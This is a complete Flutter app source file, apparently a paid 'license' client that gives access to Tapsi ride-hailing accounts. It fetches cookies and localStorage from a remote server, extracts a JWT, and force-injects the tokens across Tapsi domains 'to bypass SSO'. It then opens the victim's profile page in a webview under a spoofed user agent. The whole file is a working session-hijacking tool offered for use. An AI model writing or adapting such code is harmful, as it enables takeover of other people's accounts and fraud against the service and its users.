import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:collection';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const PremiumClientApp());
}

class PremiumClientApp extends StatelessWidget {
  const PremiumClientApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Premium Access',
      theme: ThemeData.dark().copyWith(
        primaryColor: const Color(0xFF5CEBFF),
        scaffoldBackgroundColor: const Color(0xFF0B0C10),
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFF5CEBFF),
          secondary: Color(0xFFD4AF37),
        ),
      ),
      debugShowCheckedModeBanner: false,
      home: const AuthenticationScreen(),
    );
  }
}

// ==========================================
// SECURE AUTHENTICATION SCREEN
// ==========================================
class AuthenticationScreen extends StatefulWidget {
  const AuthenticationScreen({Key? key}) : super(key: key);

  @override
  State<AuthenticationScreen> createState() => _AuthenticationScreenState();
}

class _AuthenticationScreenState extends State<AuthenticationScreen> {
  final TextEditingController _licenseController = TextEditingController();
  bool _isLoading = false;
  String _errorMessage = '';

  Future<void> _verifyLicense() async {
    final licenseKey = _licenseController.text.trim();
    if (licenseKey.isEmpty || !licenseKey.startsWith('TAPSI-')) {
      setState(() => _errorMessage = 'INVALID LICENSE FORMAT');
      return;
    }

    setState(() {
      _isLoading = true;
      _errorMessage = '';
    });

    try {
      final response = await http.get(
        Uri.parse('https://testtok-production.up.railway.app/api/tapsi/get-license/$licenseKey'),
      );

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          final cookies = data['data']['cookies'] ?? '';
          final localStorage = data['data']['local_storage'] ?? '{}';
          
          if (!mounted) return;
          Navigator.pushReplacement(
            context,
            PageRouteBuilder(
              pageBuilder: (context, animation, secondaryAnimation) => CoreEngineScreen(
                cookies: cookies,
                localStorageStr: localStorage,
              ),
              transitionsBuilder: (context, animation, secondaryAnimation, child) {
                return FadeTransition(opacity: animation, child: child);
              },
            ),
          );
        }
      } else {
        setState(() => _errorMessage = 'LICENSE EXPIRED OR UNAUTHORIZED');
      }
    } catch (e) {
      setState(() => _errorMessage = 'SECURE CONNECTION FAILED');
    } finally {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF1F2833), Color(0xFF0B0C10)],
          ),
        ),
        child: Center(
          child: SingleChildScrollView(
            padding: const EdgeInsets.symmetric(horizontal: 32.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Container(
                  padding: const EdgeInsets.all(24),
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: const Color(0xFF5CEBFF).withOpacity(0.05),
                    boxShadow: [
                      BoxShadow(
                        color: const Color(0xFF5CEBFF).withOpacity(0.15),
                        blurRadius: 40,
                        spreadRadius: 10,
                      )
                    ]
                  ),
                  child: const Icon(Icons.fingerprint_rounded, size: 80, color: Color(0xFF5CEBFF)),
                ),
                const SizedBox(height: 40),
                const Text(
                  'SYSTEM ACCESS',
                  style: TextStyle(
                    fontSize: 24,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 6.0,
                    color: Colors.white,
                  ),
                ),
                const SizedBox(height: 12),
                const Text(
                  'Provide your secure token to proceed',
                  style: TextStyle(fontSize: 13, color: Colors.white54, letterSpacing: 1.2),
                ),
                const SizedBox(height: 45),
                TextField(
                  controller: _licenseController,
                  style: const TextStyle(color: Color(0xFF5CEBFF), letterSpacing: 2.5, fontWeight: FontWeight.bold, fontSize: 16),
                  decoration: InputDecoration(
                    filled: true,
                    fillColor: Colors.black.withOpacity(0.4),
                    hintText: 'TAPSI-XXXX-XXXX',
                    hintStyle: const TextStyle(color: Colors.white24, letterSpacing: 3.0),
                    contentPadding: const EdgeInsets.symmetric(vertical: 22),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(20),
                      borderSide: BorderSide(color: Colors.white.withOpacity(0.05), width: 1),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(20),
                      borderSide: const BorderSide(color: Color(0xFF5CEBFF), width: 1.5),
                    ),
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 20),
                if (_errorMessage.isNotEmpty)
                  Padding(
                    padding: const EdgeInsets.only(bottom: 20),
                    child: Text(_errorMessage, style: const TextStyle(color: Color(0xFFFF5252), fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1.0)),
                  ),
                SizedBox(
                  width: double.infinity,
                  height: 60,
                  child: ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF5CEBFF),
                      foregroundColor: const Color(0xFF0B0C10),
                      elevation: 8,
                      shadowColor: const Color(0xFF5CEBFF).withOpacity(0.4),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
                    ),
                    onPressed: _isLoading ? null : _verifyLicense,
                    child: _isLoading 
                        ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: Color(0xFF0B0C10), strokeWidth: 3))
                        : const Text('AUTHENTICATE', style: TextStyle(fontSize: 16, fontWeight: FontWeight.w900, letterSpacing: 3.0)),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

// ==========================================
// CORE ENGINE SCREEN (WEBVIEW)
// ==========================================
class CoreEngineScreen extends StatefulWidget {
  final String cookies;
  final String localStorageStr;

  const CoreEngineScreen({
    Key? key,
    required this.cookies,
    required this.localStorageStr,
  }) : super(key: key);

  @override
  State<CoreEngineScreen> createState() => _CoreEngineScreenState();
}

class _CoreEngineScreenState extends State<CoreEngineScreen> {
  InAppWebViewController? webViewController;
  bool _isEngineReady = false;
  String _extractedJwt = '';

  @override
  void initState() {
    super.initState();
    _extractToken();
    _initializeEngine();
  }

  // Laser extraction of the JWT token from raw data
  void _extractToken() {
    try {
      RegExp exp1 = RegExp(r'"accessToken"\s*:\s*"([^"]+)"');
      var match1 = exp1.firstMatch(widget.localStorageStr);
      if (match1 != null) {
        _extractedJwt = match1.group(1)!;
        return;
      }
      RegExp exp2 = RegExp(r'"token"\s*:\s*"([^"]+)"');
      var match2 = exp2.firstMatch(widget.localStorageStr);
      if (match2 != null) {
        _extractedJwt = match2.group(1)!;
        return;
      }
      RegExp exp3 = RegExp(r'"(eyJ[a-zA-Z0-9-_.]+)"');
      var match3 = exp3.firstMatch(widget.localStorageStr);
      if (match3 != null) {
        _extractedJwt = match3.group(1)!;
      }
    } catch (e) {
      debugPrint("Token extraction failed.");
    }
  }

  Future<void> _initializeEngine() async {
    CookieManager cookieManager = CookieManager.instance();
    
    List<String> targetDomains = [
      ".tapsi.cab", "app.tapsi.cab", "api.tapsi.cab", 
      ".tapsi.ir", "accounts.tapsi.ir", "accounts-api.tapsi.ir", 
      ".tapsi.markets", "www.tapsi.markets", "apigateway.tapsi.markets"
    ];

    // 1. Inject API Cookies
    if (widget.cookies.isNotEmpty && widget.cookies != 'empty') {
      List<String> cookiePairs = widget.cookies.split(';');
      for (String pair in cookiePairs) {
        List<String> parts = pair.trim().split('=');
        if (parts.length >= 2) {
          String name = parts[0].trim();
          String value = parts.sublist(1).join('=').trim();
          
          for (String d in targetDomains) {
            String urlStr = "https://" + (d.startsWith('.') ? d.substring(1) : d);
            await cookieManager.setCookie(
              url: WebUri(urlStr), name: name, value: value, domain: d, isSecure: true, sameSite: HTTPCookieSameSitePolicy.NONE,
            );
          }
        }
      }
    }

    // 2. Force Inject JWT Token globally to bypass SSO
    if (_extractedJwt.isNotEmpty) {
      for (String d in targetDomains) {
        String urlStr = "https://" + (d.startsWith('.') ? d.substring(1) : d);
        await cookieManager.setCookie(
          url: WebUri(urlStr), name: "token", value: _extractedJwt, domain: d, isSecure: true, sameSite: HTTPCookieSameSitePolicy.NONE,
        );
        await cookieManager.setCookie(
          url: WebUri(urlStr), name: "tokenMS", value: _extractedJwt, domain: d, isSecure: true, sameSite: HTTPCookieSameSitePolicy.NONE,
        );
        await cookieManager.setCookie(
          url: WebUri(urlStr), name: "accessToken", value: _extractedJwt, domain: d, isSecure: true, sameSite: HTTPCookieSameSitePolicy.NONE,
        );
      }
    }

    setState(() => _isEngineReady = true);
  }

  String _buildInjectionScript() {
    // Bulletproof JSON encoding to prevent JS syntax crash
    String safeLs = jsonEncode(widget.localStorageStr);
    
    return """
      try {
        var jwt = "$_extractedJwt";
        if (jwt) {
           window.localStorage.setItem('token', jwt);
           window.localStorage.setItem('accessToken', jwt);
           document.cookie = "token=" + jwt + "; path=/; domain=.tapsi.markets; secure; samesite=none";
           document.cookie = "token=" + jwt + "; path=/; domain=.tapsi.ir; secure; samesite=none";
        }
        
        var rawData = $safeLs;
        if (rawData && rawData !== '{}') {
           var lsData = JSON.parse(rawData);
           for (var key in lsData) {
              var val = typeof lsData[key] === 'string' ? lsData[key] : JSON.stringify(lsData[key]);
              window.localStorage.setItem(key, val);
              window.sessionStorage.setItem(key, val);
           }
        }
      } catch(e) {
        console.error("Injection Engine Error: ", e);
      }
      
      // Override popups to load internally
      window.open = function(url, target, features) {
        window.location.href = url;
        return null;
      };
      
      document.addEventListener('click', function(e) {
        var a = e.target.closest('a');
        if (a && a.getAttribute('target') === '_blank') {
          a.setAttribute('target', '_self');
        }
      }, true);
    """;
  }

  @override
  Widget build(BuildContext context) {
    if (!_isEngineReady) {
      return Scaffold(
        backgroundColor: const Color(0xFF0B0C10),
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: const [
              SizedBox(width: 40, height: 40, child: CircularProgressIndicator(color: Color(0xFF5CEBFF), strokeWidth: 2)),
              SizedBox(height: 24),
              Text('INITIALIZING CORE ENGINE...', style: TextStyle(color: Color(0xFF5CEBFF), letterSpacing: 3.0, fontSize: 11, fontWeight: FontWeight.bold)),
            ],
          )
        )
      );
    }

    UserScript injectionScript = UserScript(
      source: _buildInjectionScript(),
      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
      forMainFrameOnly: false, 
    );

    return PopScope(
      canPop: false,
      onPopInvoked: (didPop) async {
        if (didPop) return;
        if (webViewController != null && await webViewController!.canGoBack()) {
          webViewController!.goBack();
        } else {
          if (context.mounted) Navigator.of(context).pop();
        }
      },
      child: Scaffold(
        backgroundColor: const Color(0xFF0B0C10),
        body: SafeArea(
          child: InAppWebView(
            initialUrlRequest: URLRequest(url: WebUri("https://app.tapsi.cab/profile/")),
            initialUserScripts: UnmodifiableListView<UserScript>([injectionScript]),
            initialSettings: InAppWebViewSettings(
              javaScriptEnabled: true,
              domStorageEnabled: true,
              clearCache: true,
              thirdPartyCookiesEnabled: true, 
              supportMultipleWindows: false,
              javaScriptCanOpenWindowsAutomatically: false,
              userAgent: "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            ),
            onWebViewCreated: (controller) {
              webViewController = controller;
            },
            onLoadStop: (controller, url) async {
              bool? isReloaded = await controller.evaluateJavascript(source: "window.sessionStorage.getItem('core_init');") == 'true';
              if (!isReloaded) {
                await controller.evaluateJavascript(source: "window.sessionStorage.setItem('core_init', 'true');");
                controller.reload();
              }
            },
          ),
        ),
      ),
    );
  }
}
